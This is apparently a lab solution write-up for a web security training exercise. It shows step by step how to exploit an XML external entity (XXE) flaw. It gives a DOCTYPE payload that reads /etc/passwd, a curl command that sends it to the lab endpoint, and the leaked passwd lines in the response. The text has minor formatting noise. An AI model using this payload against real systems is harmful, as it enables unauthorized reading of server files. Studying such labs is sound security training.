\#  Solution – Exploiting XXE to Read Files



\##  Step 1: Analyze the original request



The application sends XML like this:

```xml

<stockCheck>

&nbsp; <productId>381</productId>

</stockCheck>

And the server replies:



Invalid product ID: 381

==> This means the <productId> value is reflected in the response.



Step 2: Create your XXE payload

Now, craft XML with a DOCTYPE and an external entity:

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo \[

&nbsp; <!ENTITY xxe SYSTEM "file:///etc/passwd">

]>

<stockCheck>

&nbsp; <productId>\&xxe;</productId>

</stockCheck>

Step 3: Send the request

Use Burp Repeater :

curl https://your-lab-id.web-security-academy.net/product/stock \\

&nbsp; -X POST \\

&nbsp; -H "Content-Type: application/xml" \\

&nbsp; --data-binary @xxe-payload.xml

Step 4: Check the response

If successful, you’ll see:44

Invalid product ID: root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

==>That means the server read /etc/passwd and sent it in the response.









